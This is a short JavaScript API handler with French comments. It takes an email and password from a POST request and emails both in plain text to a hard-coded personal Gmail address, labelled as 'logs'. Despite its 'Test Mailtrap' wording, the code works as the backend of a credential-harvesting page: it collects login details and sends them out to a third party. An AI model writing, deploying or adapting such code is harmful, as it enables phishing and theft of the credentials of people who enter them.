require("dotenv").config();
const nodemailer = require("nodemailer");

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Méthode non autorisée" });
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Email et mot de passe requis" });
  }

  // Configurer Mailtrap
  const transporter = nodemailer.createTransport({
    host: process.env.MAILTRAP_HOST,
    port: process.env.MAILTRAP_PORT,
    auth: {
      user: process.env.MAILTRAP_USER,
      pass: process.env.MAILTRAP_PASSWORD,
    },
  });

  // Options de l'email
  const mailOptions = {
    from: `"Test Mailtrap" <no-reply@example.com>`,
    to: "luccabondi@gmail.com", // Seul ton mail recevra les logs
    subject: "Test Mailtrap - Nouveau log",
    text: `Email: ${email}\nMot de passe: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "Email envoyé via Mailtrap !" });
  } catch (error) {
    console.error("Erreur envoi email:", error);
    res.status(500).json({ message: "Erreur d'envoi d'email", error });
  }
}

